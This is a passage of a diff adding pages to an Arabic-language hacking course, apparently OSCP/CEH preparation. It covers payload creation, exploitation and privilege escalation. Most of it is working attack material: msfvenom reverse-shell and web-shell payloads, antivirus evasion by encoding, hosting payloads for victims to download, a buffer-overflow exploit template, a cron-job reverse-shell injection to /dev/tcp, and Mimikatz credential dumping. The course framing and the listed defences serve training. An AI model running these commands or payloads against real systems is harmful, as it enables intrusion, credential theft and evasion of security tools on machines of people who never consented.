+          <div class="cmd-ui-box" style="font-size:0.78em;">msfvenom -p windows/meterpreter/bind_tcp RHOST=TARGET LPORT=4444 -f exe > bind.exe</div>
+          <p style="color:#aaa; font-size:0.8em; margin-top:8px;">الضحية بيفتح بورت وأنت بتتصل عليه.</p>
+        </div>
+      </div>
+
+      <!-- Linux -->
+      <div style="border:1px solid rgba(80,250,123,0.3); border-radius:8px; overflow:hidden;">
+        <div style="background:rgba(80,250,123,0.08); padding:8px 14px;">
+          <strong style="color:#50fa7b; font-size:0.9em;">🐧 Linux — ELF Shell</strong>
+        </div>
+        <div style="padding:12px;">
+          <div class="cmd-ui-box" style="font-size:0.78em;">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf</div>
+          <div class="cmd-ui-box" style="font-size:0.78em; margin-top:6px;">chmod +x shell.elf && ./shell.elf</div>
+        </div>
+      </div>
+
+      <!-- PHP -->
+      <div style="border:1px solid rgba(0,191,255,0.3); border-radius:8px; overflow:hidden;">
+        <div style="background:rgba(0,191,255,0.08); padding:8px 14px;">
+          <strong style="color:#00bfff; font-size:0.9em;">🌐 PHP — Web Shell</strong>
+        </div>
+        <div style="padding:12px;">
+          <div class="cmd-ui-box" style="font-size:0.78em;">msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php</div>
+          <p style="color:#aaa; font-size:0.8em; margin-top:8px;">ترفعه على موقع PHP — يتصل بيك أوتوماتيك عند التشغيل.</p>
+        </div>
+      </div>
+
+      <!-- Encoded -->
+      <div style="border:1px solid rgba(241,250,140,0.3); border-radius:8px; overflow:hidden;">
+        <div style="background:rgba(241,250,140,0.06); padding:8px 14px; display:flex; justify-content:space-between;">
+          <strong style="color:#f1fa8c; font-size:0.9em;">🔒 Encoded — Bypass AV</strong>
+          <span style="font-size:0.75em; color:#ff9900;">⚠️ Advanced</span>
+        </div>
+        <div style="padding:12px;">
+          <div class="cmd-ui-box" style="font-size:0.78em;">msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe</div>
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:5px; margin-top:8px; font-size:0.78em; color:#6272a4;">
+            <span><code>-e</code> الـ encoder</span>
+            <span><code>-i 3</code> عدد التشفيرات</span>
+          </div>
+          <p style="color:#aaa; font-size:0.8em; margin-top:8px;">يشفر الـ payload 3 مرات لتجاوز الـ Antivirus.</p>
+        </div>
+      </div>
+
+      <!-- List payloads -->
+      <div style="border:1px solid rgba(189,147,249,0.3); border-radius:8px; overflow:hidden;">
+        <div style="background:rgba(189,147,249,0.08); padding:8px 14px;">
+          <strong style="color:#bd93f9; font-size:0.9em;">📋 شوف كل الـ Payloads</strong>
+        </div>
+        <div style="padding:12px;">
+          <div class="cmd-ui-box" style="font-size:0.78em;">msfvenom -l payloads</div>
+          <div class="cmd-ui-box" style="font-size:0.78em; margin-top:6px;">msfvenom -l payloads | grep windows</div>
+          <div class="cmd-ui-box" style="font-size:0.78em; margin-top:6px;">msfvenom -l encoders</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- HOSTING + HANDLER -->
+  <div class="cyber-card" style="border-top:3px solid #50fa7b;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#50fa7b;">🌐 3. استضافة الـ Payload + استقبال الاتصال</h3>
+    </div>
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:18px;">
+      <div style="background:rgba(0,0,0,0.3); border:1px solid rgba(80,250,123,0.3); border-radius:8px; padding:15px;">
+        <h5 style="color:#50fa7b; margin-top:0;">📡 استضافة الملف (Apache)</h5>
+        <div class="cmd-ui-box" style="font-size:0.85em;">service apache2 start</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:6px;">cp reverse.exe /var/www/html/</div>
+        <p style="color:#aaa; font-size:0.85em; margin-top:10px;">الضحية يحمل الملف من:</p>
+        <div style="background:rgba(80,250,123,0.1); padding:8px; border-radius:5px; font-size:0.85em; direction:ltr; text-align:left; color:#50fa7b;">
+          http://YOUR_IP/reverse.exe
+        </div>
+        <p style="color:#6272a4; font-size:0.8em; margin-top:6px;">أو بديل سريع: <code>python3 -m http.server 80</code></p>
+      </div>
+      <div style="background:rgba(0,0,0,0.3); border:1px solid rgba(255,153,0,0.3); border-radius:8px; padding:15px;">
+        <h5 style="color:#ff9900; margin-top:0;">🎧 Handler — استقبال الاتصال</h5>
+        <div class="cmd-ui-box" style="font-size:0.85em;">use exploit/multi/handler</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:5px;">set payload windows/meterpreter/reverse_tcp</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:5px;">set LHOST YOUR_IP</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:5px;">set LPORT 4444</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:5px;">run</div>
+        <div style="background:rgba(80,250,123,0.1); border:1px solid #50fa7b; padding:6px; border-radius:4px; margin-top:10px; font-family:monospace; font-size:0.8em; direction:ltr; text-align:left; color:#50fa7b;">
+          [*] Meterpreter session 1 opened! 🔥
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- BUFFER OVERFLOW -->
+  <div class="cyber-card" style="border-top:3px solid #ff0044; background:rgba(255,0,68,0.03);">
+    <div class="card-header">
+      <h3 style="margin:0; color:#ff0044;">💥 4. Buffer Overflow — أخطر وأصعب هجوم 🔥🔥🔥</h3>
+    </div>
+
+    <!-- Theory -->
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:18px;">
+      <div>
+        <h5 style="color:#fff;">🧠 الفكرة الأساسية:</h5>
+        <p style="color:#aaa; font-size:0.9em; line-height:1.9;">
+          كل برنامج عنده <strong>Buffer</strong> — منطقة ذاكرة محددة الحجم لاستقبال الـ Input.
+          لو بعثت بيانات <strong>أكبر من الـ Buffer</strong>، البيانات الزيادة هتكتب فوق مناطق مهمة في الذاكرة!
+        </p>
+        <div style="background:rgba(255,0,68,0.1); border-left:3px solid #ff0044; padding:10px; border-radius:4px; margin-top:10px; font-size:0.85em;">
+          🎯 <strong>الهدف:</strong> الكتابة فوق الـ <strong>EIP</strong> (Instruction Pointer) — اللي بيتحكم في التعليمة الجاية — وتوجيهه لـ Shellcode بتاعك!
+        </div>
+      </div>
+      <div style="background:rgba(0,0,0,0.4); border:1px solid #44475a; border-radius:8px; padding:15px;">
+        <h6 style="color:#f1fa8c; margin-top:0; text-align:center;">🗺️ تخيل الذاكرة كده:</h6>
+        <div style="direction:ltr; text-align:center; font-family:monospace; font-size:0.8em; line-height:1.8;">
+          <div style="background:#44475a; padding:3px; border-radius:3px;">[ BUFFER — 200 bytes ]</div>
+          <div style="color:#6272a4;">↓ overflow يكتب هنا ↓</div>
+          <div style="background:rgba(255,153,0,0.3); padding:3px; border-radius:3px;">[ EBP — Saved Pointer ]</div>
+          <div style="background:rgba(255,0,68,0.4); padding:3px; border-radius:3px;">[ EIP — Return Address ] ← هنا نتحكم!</div>
+          <div style="background:rgba(80,250,123,0.3); padding:3px; border-radius:3px;">[ SHELLCODE هنا 🔥 ]</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Steps -->
+    <h5 style="color:#f1fa8c; margin-top:25px;">⚙️ خطوات Buffer Overflow (المنهج الكامل):</h5>
+
+    <!-- Step 1 -->
+    <div style="margin-top:15px; border:1px solid rgba(0,191,255,0.3); border-radius:8px; overflow:hidden;">
+      <div style="background:rgba(0,191,255,0.1); padding:8px 15px; display:flex; align-items:center; gap:10px;">
+        <span style="background:#00bfff; color:#000; padding:2px 10px; border-radius:12px; font-size:0.8em; font-weight:bold;">STEP 1</span>
+        <strong style="color:#00bfff;">فحص البرنامج — هل بيقبل input؟</strong>
+      </div>
+      <div style="padding:12px;">
+        <div class="cmd-ui-box" style="font-size:0.85em;">nc 192.168.1.5 9999</div>
+        <p style="color:#aaa; font-size:0.85em; margin-top:6px;">جرب تبعت بيانات وشوف إيه الـ response.</p>
+      </div>
+    </div>
+
+    <!-- Step 2 -->
+    <div style="margin-top:10px; border:1px solid rgba(189,147,249,0.3); border-radius:8px; overflow:hidden;">
+      <div style="background:rgba(189,147,249,0.1); padding:8px 15px; display:flex; align-items:center; gap:10px;">
+        <span style="background:#bd93f9; color:#000; padding:2px 10px; border-radius:12px; font-size:0.8em; font-weight:bold;">STEP 2</span>
+        <strong style="color:#bd93f9;">Fuzzing — عند أد إيه البرنامج يقع؟</strong>
+      </div>
+      <div style="padding:12px;">
+        <div style="background:rgba(0,0,0,0.4); border:1px solid #44475a; border-radius:6px; padding:12px; direction:ltr; text-align:left; font-family:monospace; font-size:0.82em;">
+          <span style="color:#bd93f9;">import</span> socket<br><br>
+          buffer = <span style="color:#f1fa8c;">"A"</span> * <span style="color:#ff9900;">100</span><br><br>
+          <span style="color:#bd93f9;">while True:</span><br>
+          &nbsp;&nbsp;<span style="color:#bd93f9;">try:</span><br>
+          &nbsp;&nbsp;&nbsp;&nbsp;s = socket.socket()<br>
+          &nbsp;&nbsp;&nbsp;&nbsp;s.connect((<span style="color:#f1fa8c;">"192.168.1.5"</span>, <span style="color:#ff9900;">9999</span>))<br>
+          &nbsp;&nbsp;&nbsp;&nbsp;s.send(buffer.encode())<br>
+          &nbsp;&nbsp;&nbsp;&nbsp;buffer += <span style="color:#f1fa8c;">"A"</span> * <span style="color:#ff9900;">100</span><br>
+          &nbsp;&nbsp;<span style="color:#bd93f9;">except:</span><br>
+          &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#50fa7b;">print</span>(<span style="color:#f1fa8c;">"Crashed at:"</span>, len(buffer))<br>
+          &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#bd93f9;">break</span>
+        </div>
+        <p style="color:#50fa7b; font-size:0.85em; margin-top:8px;">✅ هيطبعلك "Crashed at: 2200" — يعني عند 2200 بايت البرنامج وقع!</p>
+      </div>
+    </div>
+
+    <!-- Step 3 -->
+    <div style="margin-top:10px; border:1px solid rgba(255,153,0,0.3); border-radius:8px; overflow:hidden;">
+      <div style="background:rgba(255,153,0,0.1); padding:8px 15px; display:flex; align-items:center; gap:10px;">
+        <span style="background:#ff9900; color:#000; padding:2px 10px; border-radius:12px; font-size:0.8em; font-weight:bold;">STEP 3</span>
+        <strong style="color:#ff9900;">تحديد الـ Offset — فين مكان الـ EIP بالظبط؟</strong>
+      </div>
+      <div style="padding:12px;">
+        <div class="cmd-ui-box" style="font-size:0.85em;">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:6px;">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP_VALUE</div>
+        <p style="color:#aaa; font-size:0.85em; margin-top:8px;">بتبعت pattern فريد وبعدين بتشوف قيمة الـ EIP عند الـ Crash — هتعرف الـ Offset بالظبط.</p>
+        <p style="color:#50fa7b; font-size:0.85em;">مثال: <code>Exact match at offset 1978</code> — يعني الـ EIP في البايت رقم 1978!</p>
+      </div>
+    </div>
+
+    <!-- Step 4 -->
+    <div style="margin-top:10px; border:1px solid rgba(255,0,68,0.4); border-radius:8px; overflow:hidden;">
+      <div style="background:rgba(255,0,68,0.1); padding:8px 15px; display:flex; align-items:center; gap:10px;">
+        <span style="background:#ff0044; color:#fff; padding:2px 10px; border-radius:12px; font-size:0.8em; font-weight:bold;">STEP 4</span>
+        <strong style="color:#ff0044;">إدخال الـ Shellcode — السيطرة الكاملة! 😈</strong>
+      </div>
+      <div style="padding:12px;">
+        <div style="background:rgba(0,0,0,0.4); border:1px solid #44475a; border-radius:6px; padding:12px; direction:ltr; text-align:left; font-family:monospace; font-size:0.82em;">
+          <span style="color:#6272a4;"># Generate shellcode:</span><br>
+          <span style="color:#50fa7b;">msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -b "\x00" -f py</span><br><br>
+          <span style="color:#6272a4;"># Build exploit:</span><br>
+          offset = <span style="color:#ff9900;">1978</span><br>
+          eip = <span style="color:#ff9900;">b"\xAF\x11\x50\x62"</span>  <span style="color:#6272a4;"># JMP ESP address</span><br>
+          nop_sled = <span style="color:#f1fa8c;">b"\x90"</span> * <span style="color:#ff9900;">16</span><br>
+          payload = <span style="color:#f1fa8c;">b"A"</span> * offset + eip + nop_sled + shellcode
+        </div>
+        <p style="color:#50fa7b; font-size:0.85em; margin-top:8px;">✅ الـ EIP بيوجه للـ JMP ESP → NOP Sled → Shellcode → Shell مفتوح! 🔥</p>
+      </div>
+    </div>
+
+    <!-- BOF Targets -->
+    <h5 style="color:#fff; margin-top:20px;">🎯 أماكن تتدرب على BOF:</h5>
+    <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:10px; margin-top:10px; font-size:0.85em; text-align:center;">
+      <div style="background:rgba(80,250,123,0.08); border:1px solid rgba(80,250,123,0.3); border-radius:8px; padding:10px;">
+        <div style="font-size:1.5em;">🛠️</div>
+        <strong style="color:#50fa7b;">vulnserver</strong>
+        <p style="color:#aaa; font-size:0.8em; margin:4px 0 0;">Windows vulnerable server</p>
+      </div>
+      <div style="background:rgba(0,191,255,0.08); border:1px solid rgba(0,191,255,0.3); border-radius:8px; padding:10px;">
+        <div style="font-size:1.5em;">💻</div>
+        <strong style="color:#00bfff;">TryHackMe</strong>
+        <p style="color:#aaa; font-size:0.8em; margin:4px 0 0;">Buffer Overflow Prep room</p>
+      </div>
+      <div style="background:rgba(189,147,249,0.08); border:1px solid rgba(189,147,249,0.3); border-radius:8px; padding:10px;">
+        <div style="font-size:1.5em;">🐧</div>
+        <strong style="color:#bd93f9;">protostar</strong>
+        <p style="color:#aaa; font-size:0.8em; margin:4px 0 0;">Linux BOF challenges</p>
+      </div>
+      <div style="background:rgba(255,153,0,0.08); border:1px solid rgba(255,153,0,0.3); border-radius:8px; padding:10px;">
+        <div style="font-size:1.5em;">🏠</div>
+        <strong style="color:#ff9900;">OSCP BOF</strong>
+        <p style="color:#aaa; font-size:0.8em; margin:4px 0 0;">في الـ Lab الرسمي</p>
+      </div>
+    </div>
+
+    <!-- Protections -->
+    <div style="background:rgba(0,191,255,0.06); border:1px solid rgba(0,191,255,0.3); border-radius:8px; padding:15px; margin-top:18px;">
+      <h6 style="color:#00bfff; margin-top:0;">🛡️ الحماية من Buffer Overflow:</h6>
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; font-size:0.85em;">
+        <div style="background:rgba(0,0,0,0.3); padding:8px; border-radius:6px;"><strong style="color:#50fa7b;">ASLR</strong> <span style="color:#aaa;">— عشوائية عناوين الذاكرة</span></div>
+        <div style="background:rgba(0,0,0,0.3); padding:8px; border-radius:6px;"><strong style="color:#50fa7b;">DEP / NX</strong> <span style="color:#aaa;">— منع تنفيذ الكود من الـ Stack</span></div>
+        <div style="background:rgba(0,0,0,0.3); padding:8px; border-radius:6px;"><strong style="color:#50fa7b;">Stack Canaries</strong> <span style="color:#aaa;">— كشف الـ Overflow تلقائياً</span></div>
+        <div style="background:rgba(0,0,0,0.3); padding:8px; border-radius:6px;"><strong style="color:#50fa7b;">Bounds Checking</strong> <span style="color:#aaa;">— التحقق من حجم الـ Input</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PART 2 SUMMARY -->
+  <div class="cyber-card" style="background:rgba(0,0,0,0.4);">
+    <div class="card-header"><h3 style="margin:0; color:#fff;">💡 خلاصة Module 6 — Part 2</h3></div>
+    <table class="interactive-table" dir="rtl" style="margin-top:15px;">
+      <thead><tr><th>الجزء</th><th>الأداة</th><th>الهدف</th></tr></thead>
+      <tbody>
+        <tr><td>Payload Creation</td><td>msfvenom</td><td>إنشاء EXE / ELF / PHP خبيث</td></tr>
+        <tr><td>Hosting</td><td>Apache / Python HTTP</td><td>توصيل الـ Payload للضحية</td></tr>
+        <tr><td>Handler</td><td>multi/handler</td><td>استقبال الـ Reverse Shell</td></tr>
+        <tr><td>AV Bypass</td><td>shikata_ga_nai encoder</td><td>تجاوز الـ Antivirus</td></tr>
+        <tr><td>Fuzzing</td><td>Python socket</td><td>إيجاد حجم الـ Crash</td></tr>
+        <tr><td>Offset</td><td>pattern_create/offset</td><td>تحديد مكان الـ EIP</td></tr>
+        <tr><td style="color:#ff0044; font-weight:bold;">Buffer Overflow</td><td>Custom Python</td><td style="color:#ff0044; font-weight:bold;">سيطرة كاملة على الجهاز 🔥</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- =========================================================
+       PART 3: PRIVILEGE ESCALATION & MAINTAINING ACCESS
+       ========================================================= -->
+
+  <div style="margin: 40px 0 20px 0; border-top: 2px dashed rgba(255,255,0,0.4); padding-top: 25px;">
+    <div style="text-align:center; margin-bottom:25px;">
+      <div style="display:inline-block; background:rgba(255,255,0,0.1); border:2px solid #ffff00; border-radius:12px; padding:12px 30px; box-shadow: 0 0 15px rgba(255,255,0,0.2);">
+        <h2 style="margin:0; color:#ffff00; font-size:1.3em;">👑 Module 6 — Part 3</h2>
+        <p style="margin:5px 0 0; color:#aaa; font-size:0.9em;">Privilege Escalation · LinPEAS · Mimikatz</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- PRIV ESC CONCEPT -->
+  <div class="cyber-card" style="border-top:3px solid #ff5555;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#ff5555;">👑 1. Privilege Escalation — الطريق إلى الـ Root</h3>
+    </div>
+    <p style="color:#aaa; line-height:1.9; margin-top:12px;">
+      دخلت الجهاز بـ Reverse Shell؟ مبروك! بس أنت غالباً مجرد <code style="color:#8be9fd;">www-data</code> أو user عادي.<br>
+      هنا تيجي أخطر مرحلة: <strong>ترقية الصلاحيات (Privilege Escalation)</strong> عشان تبقى <strong>Root / Administrator</strong> 🔥.
+    </p>
+
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:15px;">
+      <div style="background:rgba(255,85,85,0.08); border:1px solid rgba(255,85,85,0.3); border-radius:8px; padding:15px; text-align:center;">
+        <div style="font-size:2em; margin-bottom:5px;">⬆️</div>
+        <strong style="color:#ff5555; display:block; margin-bottom:5px;">Vertical Escalation</strong>
+        <span style="color:#aaa; font-size:0.85em;">من User عادي → إلى Admin/Root (نفسك تعلى).</span>
+      </div>
+      <div style="background:rgba(189,147,249,0.08); border:1px solid rgba(189,147,249,0.3); border-radius:8px; padding:15px; text-align:center;">
+        <div style="font-size:2em; margin-bottom:5px;">➡️</div>
+        <strong style="color:#bd93f9; display:block; margin-bottom:5px;">Horizontal Escalation</strong>
+        <span style="color:#aaa; font-size:0.85em;">من User عادي → إلى User عادي آخر (عنده صلاحيات مختلفة).</span>
+      </div>
+    </div>
+
+    <!-- Techniques -->
+    <h5 style="color:#fff; margin-top:25px;">⚙️ تقنيات الـ PrivEsc (إزاي بنوصل؟)</h5>
+    <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:10px; margin-top:10px; font-size:0.85em;">
+      <div style="background:rgba(0,0,0,0.3); padding:10px; border-radius:6px; border-left:3px solid #50fa7b;">
+        <strong style="color:#50fa7b;">1. Credential Exploitation</strong><br>
+        <span style="color:#aaa;">تلاقي Passwords في ملفات config أو Database.</span>
+      </div>
+      <div style="background:rgba(0,0,0,0.3); padding:10px; border-radius:6px; border-left:3px solid #ffb86c;">
+        <strong style="color:#ffb86c;">2. Kernel Exploits</strong><br>
+        <span style="color:#aaa;">ثغرة في الـ Kernel نفسه (زي DirtyCOW).</span>
+      </div>
+      <div style="background:rgba(0,0,0,0.3); padding:10px; border-radius:6px; border-left:3px solid #ff79c6;">
+        <strong style="color:#ff79c6;">3. Misconfigurations 🔥</strong><br>
+        <span style="color:#aaa;">أهم حاجة: (SUID, Cron Jobs, Writable scripts).</span>
+      </div>
+      <div style="background:rgba(0,0,0,0.3); padding:10px; border-radius:6px; border-left:3px solid #8be9fd;">
+        <strong style="color:#8be9fd;">4. Password Attacks</strong><br>
+        <span style="color:#aaa;">تخمين الباسورد (Spraying / Stuffing).</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- LINPEAS -->
+  <div class="cyber-card" style="border-top:3px solid #50fa7b;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#50fa7b;">🔍 2. LinPEAS — أداة الـ OSCP السحرية</h3>
+    </div>
+    <p style="color:#aaa; margin-top:10px;">
+      الـ <strong>LinPEAS</strong> سكريبت بيفحص النظام بالكامل ويطلعلك أي Misconfiguration أو ثغرة ينفع تستغلها عشان تبقى Root.
+    </p>
+    <div style="background:rgba(0,0,0,0.4); border:1px solid #44475a; border-radius:8px; padding:15px; margin-top:15px;">
+      <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
+        <strong style="color:#50fa7b; font-size:0.9em;">📥 تحميل وتشغيل LinPEAS (من الـ Target)</strong>
+      </div>
+      <div class="cmd-ui-box" style="font-size:0.85em;">wget http://YOUR_IP/linpeas.sh</div>
+      <div class="cmd-ui-box" style="font-size:0.85em; margin-top:6px;">chmod +x linpeas.sh</div>
+      <div class="cmd-ui-box" style="font-size:0.85em; margin-top:6px; color:#ffb86c;">./linpeas.sh</div>
+      <div style="margin-top:12px; font-size:0.85em; color:#aaa; border-left:3px solid #ff5555; padding-left:10px;">
+        ⚠️ <strong>الـ Output:</strong> ركز دايماً على السطور اللي بتظهر باللون <span style="color:#ff5555; font-weight:bold;">الأحمر/الأصفر</span>، دي معناها (ثغرة PrivEsc بنسبة 99%).
+      </div>
+    </div>
+  </div>
+
+  <!-- CRON JOBS -->
+  <div class="cyber-card" style="border-top:3px solid #ffb86c;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#ffb86c;">💣 3. استغلال الـ Cron Jobs (مهم جداً)</h3>
+    </div>
+    <p style="color:#aaa; font-size:0.9em; margin-top:10px; line-height:1.8;">
+      الـ <strong>Cron</strong> هو خدمة بتشغل أوامر أو سكربتات في وقت محدد أوتوماتيك.<br>
+      لو فيه سكربت بيشتغل بصلاحيات Root وأنت كـ User عادي ليك صلاحية التعديل عليه (Writable)، تقدر تحط جواه Reverse Shell وهيتنفذ كـ Root! 🔥
+    </p>
+
+    <div style="background:rgba(255,184,108,0.08); border:1px dashed rgba(255,184,108,0.4); border-radius:8px; padding:15px; margin-top:15px;">
+      <div style="display:flex; align-items:center; gap:10px; margin-bottom:10px;">
+        <span style="background:#ffb86c; color:#000; padding:2px 8px; border-radius:4px; font-size:0.75em; font-weight:bold;">1</span>
+        <strong style="color:#ffb86c;">البحث عن الـ Cron Jobs</strong>
+      </div>
+      <div class="cmd-ui-box" style="font-size:0.85em;">cat /etc/crontab</div>
+      <p style="color:#aaa; font-size:0.8em; margin:6px 0 15px;">لقيت السطر ده: <code>* * * * * root /usr/bin/backup.sh</code> (بيشتغل كل دقيقة كـ root).</p>
+
+      <div style="display:flex; align-items:center; gap:10px; margin-bottom:10px;">
+        <span style="background:#ff5555; color:#fff; padding:2px 8px; border-radius:4px; font-size:0.75em; font-weight:bold;">2</span>
+        <strong style="color:#ff5555;">حقن الـ Reverse Shell داخل السكريبت</strong>
+      </div>
+      <div class="cmd-ui-box" style="font-size:0.85em;">echo "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" >> /usr/bin/backup.sh</div>
+      <p style="color:#50fa7b; font-size:0.85em; margin:8px 0 0;">✅ افتح Netcat على بورت 4444 واستنى دقيقة → <strong>هتستلم Root Shell! 💀</strong></p>
+    </div>
+  </div>
+
+  <!-- WINDOWS MIMIKATZ & STEGANOGRAPHY -->
+  <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:20px;">
+    
+    <!-- Mimikatz -->
+    <div class="cyber-card" style="border-top:3px solid #8be9fd; margin:0;">
+      <div class="card-header">
+        <h3 style="margin:0; color:#8be9fd;">🪟 4. Windows PrivEsc (Mimikatz)</h3>
+      </div>
+      <p style="color:#aaa; font-size:0.85em; margin-top:10px;">
+        لو اخترقت سيرفر Windows وبقيت Admin، بتشغل <strong>Mimikatz</strong> عشان تسرق باسوردات الـ Domain.
+      </p>
+      <div style="background:rgba(0,0,0,0.4); padding:12px; border-radius:6px; margin-top:10px;">
+        <div class="cmd-ui-box" style="font-size:0.8em; margin-bottom:5px;">mimikatz.exe</div>
+        <div class="cmd-ui-box" style="font-size:0.8em; margin-bottom:5px;">privilege::debug</div>
+        <div class="cmd-ui-box" style="font-size:0.8em;">sekurlsa::logonpasswords</div>
+        <p style="color:#50fa7b; font-size:0.8em; margin:8px 0 0;">✅ يسحب الباسوردات الـ Plaintext والـ NTLM Hashes من الـ RAM!</p>
+      </div>
+    </div>
+
+    <!-- Steganography -->
+    <div class="cyber-card" style="border-top:3px solid #ff79c6; margin:0;">
+      <div class="card-header">
+        <h3 style="margin:0; color:#ff79c6;">🖼️ 5. إخفاء البيانات (Steganography)</h3>
+      </div>
+      <p style="color:#aaa; font-size:0.85em; margin-top:10px;">
+        تخفي بيانات جوه ملف أو صورة. (مهم للـ CEH).
+      </p>
+      <div style="background:rgba(0,0,0,0.4); padding:12px; border-radius:6px; margin-top:10px;">
+        <strong style="color:#ff79c6; font-size:0.9em; display:block; margin-bottom:6px;">ADS (Alternate Data Streams) في ويندوز:</strong>
+        <div class="cmd-ui-box" style="font-size:0.8em; margin-bottom:5px;">notepad file.txt:hidden.txt</div>
+        <p style="color:#aaa; font-size:0.8em; margin:8px 0 0;">يخلق ملف مخفي جوا <code>file.txt</code> غير مرئي بالبحث العادي!</p>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- FINAL WORKFLOW -->
+  <div class="cyber-card" style="border-top:3px solid #f1fa8c; margin-top:20px; background:rgba(241,250,140,0.03);">
+    <div class="card-header">
+      <h3 style="margin:0; color:#f1fa8c;">🔥 الـ Workflow الكامل لـ System Hacking (احفظه)</h3>
+    </div>
+    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; margin-top:15px; padding:15px; background:rgba(0,0,0,0.4); border-radius:8px;">
+      
+      <div style="text-align:center;">
+        <div style="background:#44475a; padding:8px 15px; border-radius:6px; border:1px solid #6272a4;">
+          <strong style="color:#8be9fd; font-size:0.9em;">1. Exploit</strong>
+        </div>
+        <span style="color:#aaa; font-size:0.7em;">Reverse Shell</span>
+      </div>
+      
+      <span style="color:#6272a4;">➔</span>
+
+      <div style="text-align:center;">
+        <div style="background:#44475a; padding:8px 15px; border-radius:6px; border:1px solid #6272a4;">
+          <strong style="color:#50fa7b; font-size:0.9em;">2. Enum</strong>
+        </div>
+        <span style="color:#aaa; font-size:0.7em;"><code>whoami</code> / LinPEAS</span>
+      </div>
+
+      <span style="color:#6272a4;">➔</span>
+
+      <div style="text-align:center;">
+        <div style="background:#44475a; padding:8px 15px; border-radius:6px; border:1px solid #6272a4;">
+          <strong style="color:#ffb86c; font-size:0.9em;">3. PrivEsc</strong>
+        </div>
+        <span style="color:#aaa; font-size:0.7em;">SUID / Cron Jobs</span>
+      </div>
+
+      <span style="color:#6272a4;">➔</span>
+
+      <div style="text-align:center;">
+        <div style="background:rgba(255,0,68,0.2); padding:8px 15px; border-radius:6px; border:1px solid #ff0044;">
+          <strong style="color:#ff0044; font-size:0.9em;">4. ROOT 🔥</strong>
+        </div>
+        <span style="color:#aaa; font-size:0.7em;">Full Control</span>
+      </div>
+
+    </div>
+  </div>
+
+</div>
+
